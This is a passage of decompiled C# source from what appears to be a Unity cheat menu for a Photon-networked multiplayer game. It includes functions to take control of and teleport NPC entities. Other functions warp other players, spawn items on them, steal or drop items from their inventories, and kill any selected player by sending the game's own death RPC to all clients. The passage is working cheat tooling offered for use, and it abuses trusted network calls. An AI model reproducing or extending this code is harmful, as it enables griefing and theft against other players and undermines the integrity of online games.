						if (name.Contains("AI") || name.Contains("Enemy") || name.Contains("Zombie") || name.Contains("Behavior") || name.Contains("Controller"))
						{
							((Behaviour)val).enabled = true;
							Debug.Log((object)("[Cheat] Enabled AI component: " + name + " on " + ((Object)entity).name));
						}
					}
				}
				try
				{
					MethodInfo method = ((object)entity).GetType().GetMethod("Initialize", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						method.Invoke(entity, null);
						Debug.Log((object)("[Cheat] Called Initialize on " + ((Object)entity).name));
					}
					MethodInfo method2 = ((object)entity).GetType().GetMethod("Activate", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method2 != null)
					{
						method2.Invoke(entity, null);
						Debug.Log((object)("[Cheat] Called Activate on " + ((Object)entity).name));
					}
					if (component != null)
					{
						MethodInfo method3 = ((object)component).GetType().GetMethod("Initialize", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (method3 != null)
						{
							method3.Invoke(component, null);
							Debug.Log((object)"[Cheat] Called Initialize on Character component");
						}
					}
				}
				catch (Exception ex)
				{
					Debug.Log((object)("[Cheat] Could not call Initialize/Activate methods: " + ex.Message));
				}
				Rigidbody component3 = entity.GetComponent<Rigidbody>();
				if (component3 != null)
				{
					component3.isKinematic = false;
					component3.useGravity = true;
					Debug.Log((object)("[Cheat] Enabled Rigidbody on " + ((Object)entity).name));
				}
				Collider[] componentsInChildren = entity.GetComponentsInChildren<Collider>();
				foreach (Collider val2 in componentsInChildren)
				{
					if (val2 != null)
					{
						val2.enabled = true;
					}
				}
				Debug.Log((object)("[Cheat] Successfully initialized entity: " + ((Object)entity).name));
			}
			catch (Exception ex2)
			{
				Debug.LogError((object)("[Cheat] Failed to initialize entity: " + ex2.Message));
				Debug.LogError((object)("[Cheat] Stack trace: " + ex2.StackTrace));
			}
		}

		public static MonoBehaviour[] GetAIComponents(GameObject entity)
		{
			return EntityManager.GetAIComponents(entity).ToArray();
		}

		public static void KillEntity(GameObject entity)
		{
			EntityManager.KillEntity(entity);
			controlledEntities.Remove(entity);
			followPlayerEntities.Remove(entity);
			targetPositions.Remove(entity);
		}

		public static void TeleportEntityToMe(GameObject entity)
		{
			EntityManager.TeleportEntityToMe(entity);
		}

		public static void TeleportEntityToPlayer(GameObject entity, Character targetPlayer)
		{
			EntityManager.TeleportEntityToPlayer(entity, targetPlayer);
		}

		public static List<GameObject> GetAllEntitiesInGame()
		{
			if (!CheatConfig._entityListNeedsRefresh && Time.time - CheatConfig._lastEntityListUpdate < 0.5f && CheatConfig._cachedEntityList != null && CheatConfig._cachedEntityList.Count > 0)
			{
				CheatConfig._cachedEntityList.RemoveAll((GameObject e) => e == null);
				return CheatConfig._cachedEntityList;
			}
			List<GameObject> list = new List<GameObject>();
			try
			{
				Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
				foreach (Character val in array)
				{
					try
					{
						if (val == null || (Object)(object)val.gameObject == (Object)null || (Object)(object)val == (Object)(object)Character.localCharacter)
						{
							continue;
						}
						bool flag = false;
						try
						{
							FieldInfo field = typeof(Character).GetField("isZombie", BindingFlags.Instance | BindingFlags.Public);
							FieldInfo field2 = typeof(Character).GetField("isScoutmaster", BindingFlags.Instance | BindingFlags.Public);
							FieldInfo field3 = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
							if (field != null && (bool)field.GetValue(val))
							{
								flag = true;
							}
							if (field2 != null && (bool)field2.GetValue(val))
							{
								flag = true;
							}
							if (field3 != null && (bool)field3.GetValue(val))
							{
								flag = true;
							}
							if (!flag)
							{
								if ((Object)(object)val.gameObject.GetComponent<Player>() == (Object)null)
								{
									flag = true;
									goto end_IL_00a6;
								}
								continue;
							}
							end_IL_00a6:;
						}
						catch
						{
							try
							{
								if (!(val.player == null))
								{
									goto end_IL_0163;
								}
								flag = true;
								goto end_IL_0162;
								end_IL_0163:;
							}
							catch
							{
								try
								{
									if (!((Object)(object)val.gameObject.GetComponent<Player>() == (Object)null))
									{
										goto end_IL_017b;
									}
									flag = true;
									goto end_IL_0162;
									end_IL_017b:;
								}
								catch
								{
								}
							}
							goto end_IL_0075;
							end_IL_0162:;
						}
						if (flag && !list.Contains(val.gameObject))
						{
							list.Add(val.gameObject);
						}
						end_IL_0075:;
					}
					catch (Exception ex)
					{
						Debug.LogWarning((object)("[GUI] Error processing character in GetAllEntitiesInGame: " + ex.Message));
					}
				}
				try
				{
					Type type = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "Beetle");
					if (type != null)
					{
						Object[] array2 = Object.FindObjectsByType(type, FindObjectsSortMode.None);
						foreach (Object val2 in array2)
						{
							if (!(val2 == (Object)null))
							{
								GameObject val3 = (GameObject)(object)((val2 is GameObject) ? val2 : null);
								if (!(val3 == null) && !((Object)(object)val3.GetComponent<Character>() != (Object)null) && !list.Contains(val3))
								{
									list.Add(val3);
								}
							}
						}
					}
					Type type2 = AppDomain.CurrentDomain.GetAssemblies().SelectMany((Assembly a) => a.GetTypes()).FirstOrDefault((Type t) => t.Name == "Mob" && t.IsClass);
					if (type2 != null)
					{
						Object[] array2 = Object.FindObjectsByType(type2, FindObjectsSortMode.None);
						foreach (Object val4 in array2)
						{
							if (!(val4 == (Object)null))
							{
								GameObject val5 = (GameObject)(object)((val4 is GameObject) ? val4 : null);
								if (!(val5 == null) && !((Object)(object)val5.GetComponent<Character>() != (Object)null) && !list.Contains(val5))
								{
									list.Add(val5);
								}
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Debug.Log((object)("[GUI] Error finding additional entities: " + ex2.Message));
				}
			}
			catch (Exception ex3)
			{
				Debug.LogWarning((object)("[GUI] Error finding entities: " + ex3.Message));
			}
			CheatConfig._cachedEntityList = list;
			CheatConfig._lastEntityListUpdate = Time.time;
			return list;
		}

		public static string GetEntityDisplayName(GameObject entity)
		{
			try
			{
				if (entity == null)
				{
					return "Unknown";
				}
				Character component = entity.GetComponent<Character>();
				if (component != null)
				{
					try
					{
						FieldInfo field = typeof(Character).GetField("isZombie", BindingFlags.Instance | BindingFlags.Public);
						FieldInfo field2 = typeof(Character).GetField("isScoutmaster", BindingFlags.Instance | BindingFlags.Public);
						if (field != null && (bool)field.GetValue(component))
						{
							return "Zombie";
						}
						if (field2 != null && (bool)field2.GetValue(component))
						{
							return "Scoutmaster";
						}
					}
					catch
					{
					}
					try
					{
						MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
						foreach (MonoBehaviour val in components)
						{
							if (!(val == null))
							{
								switch (((object)val).GetType().Name)
								{
								case "Scoutmaster":
									return "Scoutmaster";
								case "MushroomZombie":
									return "Zombie";
								case "Beetle":
									return "Beetle";
								}
							}
						}
					}
					catch
					{
					}
					try
					{
						if ((Object)(object)component.gameObject.GetComponent<Player>() != (Object)null && (Object)(object)component.photonView != (Object)null && component.photonView.Owner != null)
						{
							return TruncateForDisplay(component.photonView.Owner.NickName ?? "Unknown");
						}
					}
					catch
					{
					}
					try
					{
						string entityType = GetEntityType(entity);
						if (entityType != "Player" && entityType != "Player (You)" && entityType != "Entity")
						{
							return entityType;
						}
					}
					catch
					{
					}
				}
				try
				{
					string text = ((Object)entity).name ?? "Unknown";
					text = text.Replace("(Clone)", "").Trim();
					text = text.Replace("Character_", "");
					text = text.Replace("_", " ");
					if (text == "Character" || text == "GameObject" || string.IsNullOrEmpty(text))
					{
						try
						{
							string entityType2 = GetEntityType(entity);
							if (entityType2 != "Entity")
							{
								return entityType2;
							}
						}
						catch
						{
						}
					}
					return text;
				}
				catch
				{
					return "Unknown";
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[GUI] Error in GetEntityDisplayName: " + ex.Message));
				return ((entity != null) ? ((Object)entity).name : null) ?? "Unknown";
			}
		}

		public static string GetEntityType(GameObject entity)
		{
			try
			{
				if (entity == null)
				{
					return "Unknown";
				}
				Character component = entity.GetComponent<Character>();
				if (component != null)
				{
					try
					{
						FieldInfo field = typeof(Character).GetField("isZombie", BindingFlags.Instance | BindingFlags.Public);
						FieldInfo field2 = typeof(Character).GetField("isScoutmaster", BindingFlags.Instance | BindingFlags.Public);
						if (field != null && (bool)field.GetValue(component))
						{
							return "Zombie";
						}
						if (field2 != null && (bool)field2.GetValue(component))
						{
							return "Scoutmaster";
						}
					}
					catch
					{
					}
					try
					{
						MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
						foreach (MonoBehaviour val in components)
						{
							if (val == null)
							{
								continue;
							}
							string name = ((object)val).GetType().Name;
							switch (name)
							{
							case "Scoutmaster":
								return "Scoutmaster";
							case "MushroomZombie":
								return "Zombie";
							case "Beetle":
								return "Beetle";
							}
							if (name.Contains("Scoutmaster"))
							{
								return "Scoutmaster";
							}
							if (name.Contains("Zombie"))
							{
								return "Zombie";
							}
							if (name.Contains("Beetle"))
							{
								return "Beetle";
							}
						}
					}
					catch
					{
					}
					try
					{
						if ((Object)(object)component.gameObject.GetComponent<Player>() != (Object)null && (Object)(object)component.photonView != (Object)null && component.photonView.Owner != null)
						{
							return component.photonView.IsMine ? "Player (You)" : "Player";
						}
					}
					catch
					{
					}
					try
					{
						FieldInfo field3 = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
						if (field3 != null && (bool)field3.GetValue(component))
						{
							return "Bot";
						}
					}
					catch
					{
					}
				}
				try
				{
					MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
					foreach (MonoBehaviour val2 in components)
					{
						if (val2 == null)
						{
							continue;
						}
						string name2 = ((object)val2).GetType().Name;
						switch (name2)
						{
						case "Scoutmaster":
							return "Scoutmaster";
						case "MushroomZombie":
							return "Zombie";
						case "Beetle":
							return "Beetle";
						}
						if (name2.Contains("Scoutmaster"))
						{
							return "Scoutmaster";
						}
						if (name2.Contains("Zombie"))
						{
							return "Zombie";
						}
						if (name2.Contains("Beetle"))
						{
							return "Beetle";
						}
						if (name2.Contains("Enemy"))
						{
							return "Enemy";
						}
						if (name2.Contains("NPC"))
						{
							return "NPC";
						}
					}
				}
				catch
				{
				}
				try
				{
					string text = ((Object)entity).name ?? "";
					if (text.Contains("Scoutmaster") || text.Contains("ScoutMaster") || text.Contains("Scout Master"))
					{
						return "Scoutmaster";
					}
					if (text.Contains("Zombie"))
					{
						return "Zombie";
					}
					if (text.Contains("Beetle"))
					{
						return "Beetle";
					}
					if (text.Contains("Enemy"))
					{
						return "Enemy";
					}
				}
				catch
				{
				}
				return "Entity";
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[GUI] Error in GetEntityType: " + ex.Message));
				return "Unknown";
			}
		}

		public static void DrawEntityManager()
		{
			GUIEntityManagement.Draw();
		}

		public static void EnableEntityControl(GameObject entity)
		{
			EntityControl.EnableControl(entity);
			controlledEntities[entity] = true;
			followPlayerEntities.Remove(entity);
			targetPositions.Remove(entity);
		}

		public static void DisableEntityControl(GameObject entity)
		{
			EntityControl.DisableControl(entity);
			controlledEntities.Remove(entity);
			followPlayerEntities.Remove(entity);
			targetPositions.Remove(entity);
		}

		public static void SwitchCameraToEntity(GameObject entity)
		{
		}

		public static void RestoreCameraToPlayer()
		{
		}

		public static bool IsControllingEntity()
		{
			return EntityControl.IsControllingEntity();
		}

		public static Character GetControlledEntityCharacter()
		{
			return EntityControl.GetControlledEntityCharacter();
		}

		public static void MoveEntity(GameObject entity, Vector3 direction)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				Character component = entity.GetComponent<Character>();
				if (component != null && component.input != null)
				{
					Vector3 normalized = ((Vector3)(ref component.data.lookDirection_Flat)).normalized;
					Vector3 val = Vector3.Cross(Vector3.up, normalized);
					Vector3 normalized2 = (val).normalized;
					Vector3 val2 = normalized * direction.z + normalized2 * direction.x;
					Vector3 value = entity.transform.position + (val2).normalized * 5f;
					targetPositions[entity] = value;
					followPlayerEntities.Remove(entity);
				}
				else
				{
					Vector3 value2 = entity.transform.position + (direction).normalized * 5f;
					targetPositions[entity] = value2;
					followPlayerEntities.Remove(entity);
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Cheat] Failed to move entity: " + ex.Message));
			}
		}

		public static void StopEntity(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				Character component = entity.GetComponent<Character>();
				if (component != null && component.input != null)
				{
					component.input.movementInput = Vector2.op_Implicit(Vector3.zero);
				}
				targetPositions.Remove(entity);
				followPlayerEntities.Remove(entity);
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Cheat] Failed to stop entity: " + ex.Message));
			}
		}

		public static void MakeEntityJump(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				Character component = entity.GetComponent<Character>();
				if (component != null && component.input != null)
				{
					component.input.jumpIsPressed = true;
					if (Cheat.instance != null)
					{
						((MonoBehaviour)Cheat.instance).StartCoroutine(ResetJumpInput(component));
					}
				}
				else
				{
					Rigidbody component2 = entity.GetComponent<Rigidbody>();
					if (component2 != null)
					{
						component2.AddForce(Vector3.up * 5f, (ForceMode)1);
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Cheat] Failed to make entity jump: " + ex.Message));
			}
		}

		[IteratorStateMachine(typeof(<ResetJumpInput>d__215))]
		private static IEnumerator ResetJumpInput(Character character)
		{
			return new <ResetJumpInput>d__215(0)
			{
				character = character
			};
		}

		public static void UpdateEntityControls()
		{
			if (Character.localCharacter == null || Camera.main == null)
			{
				return;
			}
			if (currentlyControlledEntity == null && controlledEntities.Count > 0)
			{
				RestoreCameraToPlayer();
				controlledEntities.Clear();
				followPlayerEntities.Clear();
				targetPositions.Clear();
				return;
			}
			if (currentlyControlledEntity != null)
			{
				bool flag = false;
				try
				{
					flag = currentlyControlledEntity != null && currentlyControlledEntity.transform != null;
				}
				catch
				{
					flag = false;
				}
				if (!flag)
				{
					GameObject val = currentlyControlledEntity;
					RestoreCameraToPlayer();
					currentlyControlledEntity = null;
					if (val != null)
					{
						controlledEntities.Remove(val);
						followPlayerEntities.Remove(val);
						targetPositions.Remove(val);
					}
					return;
				}
			}
			Vector3 val3;
			foreach (KeyValuePair<GameObject, bool> item in followPlayerEntities.ToList())
			{
				GameObject key = item.Key;
				if (key == null || !item.Value)
				{
					followPlayerEntities.Remove(key);
					continue;
				}
				try
				{
					Vector3 position = Camera.main.transform.position;
					Vector3 position2 = key.transform.position;
					Vector3 val2 = position - position2;
					if ((val2).magnitude > entityFollowDistance)
					{
						val2.y = 0f;
						val2 = (val2).normalized;
						Character component = key.GetComponent<Character>();
						if (component != null && component.input != null)
						{
							Vector3 normalized = ((Vector3)(ref component.data.lookDirection_Flat)).normalized;
							val3 = Vector3.Cross(Vector3.up, normalized);
							Vector3 normalized2 = (val3).normalized;
							float num = Vector3.Dot(val2, normalized);
							float num2 = Vector3.Dot(val2, normalized2);
							component.input.movementInput = Vector2.op_Implicit(new Vector3(num2, 0f, num) * entityControlSpeed);
						}
						else
						{
							Transform transform = key.transform;
							transform.position += val2 * entityControlSpeed * Time.deltaTime;
						}
					}
					else
					{
						StopEntity(key);
					}
				}
				catch (Exception ex)
				{
					Debug.LogError((object)("[Cheat] Error updating follow for entity: " + ex.Message));
				}
			}
			foreach (KeyValuePair<GameObject, Vector3> item2 in targetPositions.ToList())
			{
				GameObject key2 = item2.Key;
				if (key2 == null)
				{
					targetPositions.Remove(key2);
					continue;
				}
				Vector3 value = item2.Value;
				Vector3 position3 = key2.transform.position;
				Vector3 val4 = value - position3;
				if ((val4).magnitude > 0.5f)
				{
					val4 = (val4).normalized;
					Character component2 = key2.GetComponent<Character>();
					if (component2 != null && component2.input != null)
					{
						Vector3 normalized3 = ((Vector3)(ref component2.data.lookDirection_Flat)).normalized;
						val3 = Vector3.Cross(Vector3.up, normalized3);
						Vector3 normalized4 = (val3).normalized;
						float num3 = Vector3.Dot(val4, normalized3);
						float num4 = Vector3.Dot(val4, normalized4);
						component2.input.movementInput = Vector2.op_Implicit(new Vector3(num4, 0f, num3) * entityControlSpeed);
					}
					else
					{
						Transform transform2 = key2.transform;
						transform2.position += val4 * entityControlSpeed * Time.deltaTime;
					}
				}
				else
				{
					targetPositions.Remove(key2);
					StopEntity(key2);
				}
			}
		}

		public static void CreateSpawnItemButtons()
		{
			Character val = null;
			if (playerDict != null && playerDict.Count > 0 && selectedPlayerIndex >= 0 && selectedPlayerIndex < playerDict.Keys.Count)
			{
				string[] array = playerDict.Keys.ToArray();
				val = playerDict[array[selectedPlayerIndex]];
			}
			if (val == null)
			{
				val = GetLocalPlayer();
			}
			object obj;
			if (!(val != null) || !((Object)(object)val.photonView != (Object)null) || !val.photonView.IsMine)
			{
				if (!(val != null) || !((Object)(object)val.photonView != (Object)null))
				{
					obj = "Spawn on Me";
				}
				else
				{
					Player owner = val.photonView.Owner;
					obj = "Spawn on " + TruncateForDisplay(((owner != null) ? owner.NickName : null) ?? "Selected Player");
				}
			}
			else
			{
				obj = "Spawn on Me";
			}
			if (GUILayout.Button((string)obj, buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
			{
				if (val == null)
				{
					RefreshPlayerDict();
					Debug.LogWarning((object)"No target player found for spawning item");
					return;
				}
				try
				{
					GameObject val2 = PhotonNetwork.Instantiate("0_Items/" + items[selectedItemIndex], val.Center + Vector3.up * 3f, Quaternion.identity, (byte)0, (object[])null);
					if (val2 != null)
					{
						Item component = val2.GetComponent<Item>();
						if (component != null)
						{
							component.Interact(val);
						}
					}
				}
				catch (Exception ex)
				{
					Debug.LogError((object)("[GUI] Failed to spawn item: " + ex.Message));
				}
			}
			GUILayout.Space(4f);
			if (!GUILayout.Button("Spawn on Everyone", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
			{
				return;
			}
			foreach (Character value in playerDict.Values)
			{
				if (value == null)
				{
					continue;
				}
				try
				{
					GameObject val3 = PhotonNetwork.Instantiate("0_Items/" + items[selectedItemIndex], value.Center + Vector3.up * 3f, Quaternion.identity, (byte)0, (object[])null);
					if (val3 != null)
					{
						Item component2 = val3.GetComponent<Item>();
						if (component2 != null)
						{
							component2.Interact(value);
						}
					}
				}
				catch (Exception ex2)
				{
					PhotonView photonView = value.photonView;
					object obj2;
					if (photonView == null)
					{
						obj2 = null;
					}
					else
					{
						Player owner2 = photonView.Owner;
						obj2 = ((owner2 != null) ? owner2.NickName : null);
					}
					if (obj2 == null)
					{
						obj2 = "Unknown";
					}
					string text = TruncateForDisplay((string)obj2);
					Debug.LogError((object)("[GUI] Failed to spawn item on " + text + ": " + ex2.Message));
				}
			}
		}

		public static void CreateWarpButtons()
		{
			Character localPlayer = GetLocalPlayer();
			if (localPlayer == null)
			{
				GUILayout.Label("Local player not ready", labelStyle, Array.Empty<GUILayoutOption>());
				return;
			}
			string[] array = playerDict?.Keys.ToArray();
			if (array == null || array.Length == 0 || selectedPlayerIndex < 0 || selectedPlayerIndex >= array.Length)
			{
				GUILayout.Label("No players found or invalid selection", labelStyle, Array.Empty<GUILayoutOption>());
				return;
			}
			Character val = playerDict[array[selectedPlayerIndex]];
			if (GUILayout.Button("Warp to Player", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(30f) }) && val != null)
			{
				localPlayer.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2]
				{
					val.refs.head.transform.position,
					false
				});
			}
			GUILayout.Space(4f);
			if (GUILayout.Button("Warp Player to Me", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(30f) }) && val != null)
			{
				val.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2]
				{
					localPlayer.refs.head.transform.position,
					false
				});
			}
			GUILayout.Space(4f);
			if (!GUILayout.Button("Warp Everyone to Me", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(30f) }))
			{
				return;
			}
			foreach (Character value in playerDict.Values)
			{
				if (value != null && (Object)(object)value.photonView != (Object)null)
				{
					value.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2]
					{
						localPlayer.refs.head.transform.position,
						false
					});
				}
			}
		}

		public static void CreateRespawnButtons()
		{
			try
			{
				if (playerDict == null || playerDict.Count == 0)
				{
					GUILayout.Label("No players found", labelStyle, Array.Empty<GUILayoutOption>());
					return;
				}
				string[] array = playerDict.Keys.ToArray();
				if (selectedPlayerIndex < 0 || selectedPlayerIndex >= array.Length)
				{
					GUILayout.Label("Invalid player selection", labelStyle, Array.Empty<GUILayoutOption>());
					return;
				}
				Character val = playerDict.Values.FirstOrDefault((Character x) => x.IsLocal || x.player.photonView.IsMine);
				if (val == null)
				{
					GUILayout.Label("Local player not found", labelStyle, Array.Empty<GUILayoutOption>());
					return;
				}
				Character val2 = playerDict[array[selectedPlayerIndex]];
				if (val2 == null)
				{
					GUILayout.Label("Selected player not found", labelStyle, Array.Empty<GUILayoutOption>());
					return;
				}
				if (GUILayout.Button("Respawn self at player", Array.Empty<GUILayoutOption>()))
				{
					val.photonView.RPC("RPCA_ReviveAtPosition", RpcTarget.All, new object[2]
					{
						val2.refs.head.transform.position,
						true
					});
				}
				if (GUILayout.Button("Respawn player at self", Array.Empty<GUILayoutOption>()))
				{
					val2.photonView.RPC("RPCA_ReviveAtPosition", RpcTarget.All, new object[2]
					{
						val.refs.head.transform.position,
						true
					});
				}
				if (GUILayout.Button("Respawn player at Position", Array.Empty<GUILayoutOption>()))
				{
					Vector3 val3 = ((val2.Ghost != null) ? val2.Ghost.transform.position : val2.Head);
					val2.photonView.RPC("RPCA_ReviveAtPosition", RpcTarget.All, new object[2]
					{
						val3 + new Vector3(0f, 4f, 0f),
						false
					});
				}
			}
			catch (Exception ex)
			{
				GUILayout.Label("Respawn error: " + ex.Message, labelStyle, Array.Empty<GUILayoutOption>());
			}
		}

		public static void CreateKillPlayerButton()
		{
			if (GUILayout.Button("Kill Player", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && playerDict.Count != 0)
			{
				Character val = playerDict.Values.First((Character x) => x.player.photonView.Owner.NickName == playerDict.Keys.ToArray()[selectedPlayerIndex]);
				val.photonView.RPC("RPCA_Die", RpcTarget.All, new object[1] { val.Center });
			}
		}

		public static void DrawPlayerTab()
		{
			GUIPlayersTab.Draw();
		}

		public static void DrawInventoryManagement()
		{
			GUIPlayerManagement.DrawInventoryManagement();
		}

		public static void DropItemFromPlayer(Character targetPlayer, byte slotID)
		{
			try
			{
				if (targetPlayer == null || targetPlayer.player == null || targetPlayer.refs == null || targetPlayer.refs.items == null)
				{
					return;
				}
				ItemSlot itemSlot = targetPlayer.player.GetItemSlot(slotID);
				if (itemSlot.IsEmpty() || itemSlot.prefab == null)
				{
					return;
				}
				Vector3 val = targetPlayer.Center;
				try
				{
					MethodInfo method = typeof(Character).GetMethod("GetBodypart", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method != null)
					{
						object obj = method.Invoke(targetPlayer, new object[1] { (object)(BodypartType)0 });
						Bodypart val2 = (Bodypart)((obj is Bodypart) ? obj : null);
						if (val2 != null && (Object)(object)val2.transform != (Object)null)
						{
							val = targetPlayer.Center + val2.transform.forward * 0.6f;
						}
					}
				}
				catch
				{
				}
				targetPlayer.refs.items.photonView.RPC("DropItemFromSlotRPC", RpcTarget.All, new object[2] { slotID, val });
				string text = TruncateForDisplay(targetPlayer.photonView.Owner.NickName);
				Debug.Log((object)("[Inventory] Dropped " + itemSlot.prefab.GetName() + " from " + text + "!"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Inventory] Failed to drop item: " + ex.Message));
			}
		}

		public static void StealItemFromPlayer(Character targetPlayer, byte slotID)
		{
			try
			{
				if (Character.localCharacter == null || Character.localCharacter.player == null || targetPlayer == null || targetPlayer.player == null)
				{
					return;
				}
				ItemSlot itemSlot = targetPlayer.player.GetItemSlot(slotID);
				if (!itemSlot.IsEmpty() && !(itemSlot.prefab == null))
				{
					ItemSlot val = default(ItemSlot);
					if (Character.localCharacter.player.AddItem(itemSlot.prefab.itemID, itemSlot.data, ref val))
					{
						targetPlayer.player.EmptySlot(Optionable<byte>.Some(slotID));
						string text = TruncateForDisplay(targetPlayer.photonView.Owner.NickName);
						Debug.Log((object)("[Inventory] Stole " + itemSlot.prefab.GetName() + " from " + text + "!"));
					}
					else
					{
						Debug.LogWarning((object)"[Inventory] Failed to steal item - local inventory full!");
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Inventory] Failed to steal item: " + ex.Message));
			}
		}

		public static void CookPlayerItem(Character targetPlayer, byte slotID)
		{
			try
			{
				if (targetPlayer == null || targetPlayer.player == null)
				{
					return;
				}
				ItemSlot itemSlot = targetPlayer.player.GetItemSlot(slotID);
				if (itemSlot.IsEmpty() || itemSlot.prefab == null)
				{
					return;
				}
				Item val = null;
				if (targetPlayer.data.currentItem != null && targetPlayer.data.currentItem.itemID == itemSlot.prefab.itemID)
				{
					val = targetPlayer.data.currentItem;
				}
				else
				{
					Item[] array = Object.FindObjectsByType<Item>(FindObjectsSortMode.None);
					foreach (Item val2 in array)
					{
						if (val2 != null && val2.itemID == itemSlot.prefab.itemID && val2.data != null && val2.data.guid == itemSlot.data.guid)
						{
							val = val2;
							break;
						}
					}
				}
				if (val != null)
				{
					ItemCooking component = ((Component)val).GetComponent<ItemCooking>();
					if (component != null && component.canBeCooked)
					{
						if ((Object)(object)val.photonView != (Object)null && val.photonView.IsMine)
						{
							component.FinishCooking();
							string text = TruncateForDisplay(targetPlayer.photonView.Owner.NickName);
							Debug.Log((object)("[Inventory] Cooked " + itemSlot.prefab.GetName() + " for " + text + "!"));
						}
						else
						{
							val.photonView.RPC("FinishCookingRPC", RpcTarget.All, Array.Empty<object>());
							Debug.Log((object)("[Inventory] Attempted to cook " + itemSlot.prefab.GetName() + " via RPC!"));
						}
					}
					else
					{
						Debug.LogWarning((object)("[Inventory] Item " + itemSlot.prefab.GetName() + " cannot be cooked!"));
					}
				}
				else
				{
					Debug.LogWarning((object)"[Inventory] Item not found in world - cannot cook!");
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Inventory] Failed to cook item: " + ex.Message));
			}
		}

		public static void DrawItemManagementTab()
		{
			GUIItemManagement.Draw();
		}

		public static void SpawnTestDummy()
		{
			if (!PhotonNetwork.InRoom)
			{
				Debug.LogWarning((object)"[GUI] Cannot spawn test dummy - not in room");
				return;
			}
			if (!PhotonNetwork.IsMasterClient)
			{
				Debug.LogWarning((object)"[GUI] Cannot spawn test dummy - must be master client");
				return;
			}
			if (Character.localCharacter == null || Camera.main == null)
			{
				Debug.LogWarning((object)"[GUI] Cannot spawn test dummy - character or camera not found");
				return;
			}
			try
			{
				Vector3 val = Camera.main.transform.position + Camera.main.transform.forward * 3f;
				val.y = Character.localCharacter.Center.y;
				GameObject val2 = null;
				string[] array = new string[4] { "Character", "Player", "0_Characters/Character", "Characters/Character" };
				foreach (string text in array)
				{
					try
					{
						val2 = PhotonNetwork.Instantiate(text, val, Quaternion.identity, (byte)0, (object[])null);
						if (val2 != null)
						{
							Debug.Log((object)("[GUI] Successfully spawned test dummy using prefab: " + text));
							break;
						}
					}
					catch (Exception ex)
					{
						Debug.Log((object)("[GUI] Failed to spawn with " + text + ": " + ex.Message));
					}
				}
				if (val2 == null)
				{
					Debug.LogError((object)"[GUI] PhotonNetwork.Instantiate returned null");
					return;
				}
				Debug.Log((object)("[GUI] Spawned player GameObject: " + ((Object)val2).name));
				((MonoBehaviour)Cheat.instance).StartCoroutine(InitializeTestDummy(val2, val));
			}
			catch (Exception ex2)
			{
				Debug.LogError((object)("[GUI] Failed to spawn test dummy: " + ex2.Message + "\n" + ex2.StackTrace));
			}
		}

		[IteratorStateMachine(typeof(<InitializeTestDummy>d__232))]
		private static IEnumerator InitializeTestDummy(GameObject dummy, Vector3 spawnPos)
		{
			return new <InitializeTestDummy>d__232(0)
			{
				dummy = dummy,
				spawnPos = spawnPos
			};
		}

		public static void KillAllTestDummies()
		{
			try
			{
				int num = 0;
				GameObject[] array = CheatConfig.SpawnedEntities.ToArray();
				foreach (GameObject val in array)
				{
					if (val == null)
					{
						continue;
					}
					Character component = val.GetComponent<Character>();
					if (component != null)
					{
						FieldInfo field = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
						bool flag = false;
						if (field != null)
						{
							flag = (bool)field.GetValue(component);
						}
						if ((flag || CheatConfig.SpawnedEntities.Contains(val)) && (Object)(object)component.photonView != (Object)null && component.photonView.IsMine)
						{
							component.photonView.RPC("RPCA_Die", RpcTarget.All, new object[1] { component.Center });
							num++;
						}
					}
				}
				Debug.Log((object)$"[GUI] Killed {num} test dummies");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[GUI] Failed to kill test dummies: " + ex.Message));
			}
		}

		private static Character GetLocalPlayer()
		{
			if (Player.localPlayer == null)
			{
				return null;
			}
			return playerDict?.Values.FirstOrDefault((Character c) => c != null && (Object)(object)c.player == (Object)(object)Player.localPlayer);
		}

		private static void InitializeStyles()
		{
			Color col = default(Color);
			((Color)(ref col))..ctor(0.05f, 0.05f, 0.05f, 0.95f);
			Color col2 = default(Color);
			((Color)(ref col2))..ctor(0.03f, 0.03f, 0.03f, 1f);
			Color col3 = default(Color);
			((Color)(ref col3))..ctor(0.12f, 0.12f, 0.12f, 1f);
			Color col4 = default(Color);
			((Color)(ref col4))..ctor(0.2f, 0.2f, 0.2f, 1f);
			Color col5 = default(Color);
			((Color)(ref col5))..ctor(0.08f, 0.08f, 0.08f, 1f);
			Color textColor = default(Color);
